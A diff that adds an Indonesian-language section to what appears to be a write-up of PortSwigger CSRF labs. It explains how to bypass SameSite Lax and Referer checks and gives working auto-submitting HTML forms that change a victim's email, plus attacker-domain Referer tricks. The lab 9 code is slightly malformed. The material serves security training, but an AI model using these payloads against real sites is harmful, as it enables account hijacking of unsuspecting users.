@@ -259,3 +259,108 @@ Kerangka kerja lain mendukung berbagai parameter serupa.
 
 
 
+## Melewati batasan SameSite Lax dengan cookie yang baru diterbitkan
+
+
+Untuk memicu penyegaran cookie tanpa korban harus masuk lagi secara manual, Anda perlu menggunakan navigasi tingkat atas, yang memastikan bahwa cookie yang terkait dengan sesi OAuth mereka saat ini disertakan. Hal ini menimbulkan tantangan tambahan karena Anda perlu mengarahkan pengguna kembali ke situs Anda sehingga Anda dapat meluncurkan serangan CSRF.
+
+Alternatifnya, Anda dapat memicu penyegaran cookie dari tab baru sehingga browser tidak meninggalkan halaman sebelum Anda dapat melancarkan serangan terakhir. Kendala kecil dalam pendekatan ini adalah browser memblokir tab popup kecuali tab tersebut dibuka melalui interaksi manual. Misalnya, popup berikut akan diblokir oleh browser secara default:
+
+`window.open('https://vulnerable-website.com/login/sso');`
+
+Untuk menyiasatinya, Anda dapat membungkus pernyataan tersebut dalam sebuah `onclick` pengendali acara sebagai berikut:
+
+`window.onclick = () => { window.open('https://vulnerable-website.com/login/sso'); }`
+
+Dengan cara ini, itu `window.open()` metode ini hanya dipanggil ketika pengguna mengklik suatu tempat di halaman.
+
+
+**Solve LAB 9**
+
+```html
+<html>
+	<body>
+window.onclick = () => { window.open('https://0aac00d6040d4f31808e301700ed0070.web-security-academy.net/my-account/change-email'); }
+		<form method="POST" id="autoSubmitForm" action="https://0aac00d6040d4f31808e301700ed0070.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="pwned@normal-user.net"/>
+		</form>
+	</body>
+    <script>
+        document.getElementById("autoSubmitForm").submit();
+    </script>
+<html>
+
+```
+
+
+## Validasi Referer bergantung pada header yang ada
+
+Beberapa aplikasi memvalidasi `Referer` header ketika ada dalam permintaan tetapi lewati validasi jika header dihilangkan.
+
+Dalam situasi ini, penyerang dapat merancang eksploitasi CSRF mereka sedemikian rupa sehingga menyebabkan browser pengguna korban menghapusnya `Referer` header dalam permintaan yang dihasilkan. Ada berbagai cara untuk mencapai hal ini, namun yang paling mudah adalah menggunakan tag META dalam halaman HTML yang menampung serangan CSRF:
+
+`<meta name="referrer" content="never">`
+
+**Solve LAB 10**
+
+```html
+<html>
+<meta name="referrer" content="no-referrer">
+	<body>
+		<form method="POST" id="autoSubmitForm" action="https://0adb00a003a277f680d06c7800090047.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="pwned@normal-user.net"/>
+			<input type="submit" value="Submit">
+		</form>
+	</body>
+   <script>
+        document.getElementById("autoSubmitForm").submit();
+    </script>
+<html>
+```
+
+
+
+## Validasi Referer dapat dielakkan
+
+Beberapa aplikasi memvalidasi `Referer` header dengan cara naif yang bisa dilewati. Misalnya, jika aplikasi memvalidasi domain di `Referer` dimulai dengan nilai yang diharapkan, maka penyerang dapat menempatkannya sebagai subdomain dari domainnya sendiri:
+
+`http://vulnerable-website.com.attacker-website.com/csrf-attack`
+
+Demikian pula, jika aplikasi hanya memvalidasi bahwa `Referer` berisi nama domainnya sendiri, maka penyerang dapat menempatkan nilai yang diperlukan di tempat lain di URL:
+
+`http://attacker-website.com/csrf-attack?vulnerable-website.com`
+
+#### Catatan
+
+Meskipun Anda mungkin dapat mengidentifikasi perilaku ini menggunakan Burp, Anda akan sering menemukan bahwa pendekatan ini tidak lagi berfungsi saat Anda menguji bukti konsep Anda di browser. Dalam upaya mengurangi risiko kebocoran data sensitif dengan cara ini, banyak browser kini menghapus string kueri dari `Referer` tajuk secara default.
+
+Anda dapat mengesampingkan perilaku ini dengan memastikan bahwa respons yang berisi eksploitasi Anda memiliki `Referrer-Policy: unsafe-url` set header (perhatikan itu `Referrer` dieja dengan benar dalam kasus ini, hanya untuk memastikan Anda memperhatikan!). Ini memastikan bahwa URL lengkap akan dikirim, termasuk string kueri.
+
+
+
+**Solve LAB 11**
+
+code:
+
+```json
+<html>
+	<body>
+<script>history.pushState('', '', '/?0ae9002b04d5ee60b9314955006b004f.web-security-academy.net')</script>
+
+		<form id="autoSubmitForm" method="POST" action="https://0ae9002b04d5ee60b9314955006b004f.web-security-academy.net/my-account/change-email">
+			<input type="hidden" name="email" value="pwned@normal-user.net"/>
+			<input type="submit" value="Submit">
+		</form>
+  <script>
+        document.getElementById("autoSubmitForm").submit();
+    </script>
+	</body>
+<html>
+```
+
+header:
+
+```json
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+```
